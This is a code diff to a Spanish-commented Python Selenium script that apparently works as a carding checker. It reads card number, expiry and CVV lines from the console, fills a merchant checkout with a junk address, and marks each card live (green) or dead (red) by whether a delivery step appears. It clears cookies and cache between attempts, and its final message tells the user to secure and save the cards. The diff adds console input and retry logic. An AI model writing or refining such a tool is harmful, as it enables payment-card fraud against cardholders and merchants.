@@ -11,7 +11,7 @@ from selenium.webdriver.chrome.options import Options
 import msvcrt  # Solo necesario en sistemas Windows
 import sys
 import logging
-
+from selenium.common.exceptions import JavascriptException
 # Configurar el nivel de registro global
 logging.basicConfig(level=logging.WARNING)
 # Deshabilitar mensajes de advertencia de WebDriver, urllib3 y otros mensajes irrelevantes
@@ -37,6 +37,7 @@ driver.minimize_window()
 
 
 def express(card, date, cvv):
+    print("\033[93mCalando...\033[0m", end='\r', flush=True)
     retry_flag = True
     while retry_flag:
         try:
@@ -230,19 +231,19 @@ def express(card, date, cvv):
                     )
                 )
             ).click()
-            retry_flag = False
+            try:
+                input_street = WebDriverWait(driver, 4).until(
+                    EC.presence_of_element_located(
+                        (By.XPATH, "//input[@class='C-KSdhEJ QmZ+J' and @id='shipping.line1']")
+                    )
+                )
+                input_street.send_keys("dwqdqwfqwfqwfqw")
+                retry_flag = False
+            except TimeoutException as e:
+                retry_flag = True
         except TimeoutException as e:
             retry_flag = True
 
-    try:
-        input_street = WebDriverWait(driver, 4).until(
-            EC.presence_of_element_located(
-                (By.XPATH, "//input[@class='C-KSdhEJ QmZ+J' and @id='shipping.line1']")
-            )
-        )
-        input_street.send_keys("dwqdqwfqwfqwfqw")
-    except TimeoutException as e:
-        pass
 
     try:
         input_zipcode = WebDriverWait(driver, 4).until(
@@ -278,8 +279,6 @@ def express(card, date, cvv):
         ).click()
     except TimeoutException as e:
         pass
-
-    from selenium.common.exceptions import JavascriptException
 
     for _ in range(3):
         try:
@@ -417,11 +416,13 @@ def express(card, date, cvv):
 
         # print("Se encontró el encabezado 'Delivery Details'.")
         formatted_date = f"{date[:2]}|20{date[2:]}"
+        print(" " * 50, end='\r')
         print("\033[92m" + f"{card}|{formatted_date}|{cvv}" + "\033[0m")
         driver.delete_all_cookies()
         limpiar_cache()
     except (TimeoutException, NoSuchElementException):
         formatted_date = f"{date[:2]}|20{date[2:]}"
+        print(" " * 50, end='\r')
         print("\033[91m" + f"{card}|{formatted_date}|{cvv}" + "\033[0m")
         driver.delete_all_cookies()
         limpiar_cache()
@@ -485,16 +486,54 @@ def cargar_cards(ruta_archivo):
     return credenciales
 
 
-def main():
-    ruta_archivo = seleccionar_archivo()
-    if not ruta_archivo:
-        print("No se seleccionó ningún archivo.")
-        return
+def cargar_cards_desde_consola():
+    print("\033[92mIngrese las tarjetas (formato: Card|MM|AAAA|CVV):\033[0m")
+    credenciales = []
 
-    credenciales = cargar_cards(ruta_archivo)
+    while True:
+        try:
+            input_line = input().strip()
+            if not input_line:
+                break
+
+            partes = input_line.split("|")
+            partes = [parte.strip() for parte in partes]
+
+            if len(partes) != 4:
+                print("\033[91mFormato incorrecto. Debe ser 'Card|MM|AAAA|CVV'.\033[0m")
+                continue
+
+            card = partes[0]
+            exp_date = partes[1] + partes[2][2:]
+            cvv = partes[3]
+            credenciales.append((card, exp_date, cvv))
+
+        except KeyboardInterrupt:
+            # Manejar la interrupción por teclado (Ctrl+C) para salir limpiamente
+            print("\n\033[91mInterrupción por teclado. Saliendo...\033[0m")
+            break
+
+    if credenciales:
+        print("\033[92mTarjetas cargadas correctamente!\033[0m")
+        print(" ")
+
+    return credenciales
+
+# Ejecutar la función
+
+
+
+def main():
+    #ruta_archivo = seleccionar_archivo()
+    #if not ruta_archivo:
+    #    print("No se seleccionó ningún archivo.")
+    #    return
+
+    #credenciales = cargar_cards(ruta_archivo)
     # credenciales = cargar_cards('cards.txt')
+    credenciales = cargar_cards_desde_consola()
     if credenciales is None:
-        print("Por favor, asegúrese de que el archivo este en el formato correcto")
+        #print("Por favor, asegúrese de que el archivo este en el formato correcto")
         return
 
     for card, date, cvv in credenciales:
@@ -508,7 +547,7 @@ if __name__ == "__main__":
     main()
     # Esperar a que el usuario presione una tecla específica antes de cerrar la consola
     print(
-        "Asegure y guarde las credenciales. Presiona la tecla 'q' para cerrar la consola."
+        "Asegure y guarde las tarjetas. Presiona la tecla 'q' para cerrar la consola."
     )
     while True:
         key = msvcrt.getch().decode("utf-8").lower()
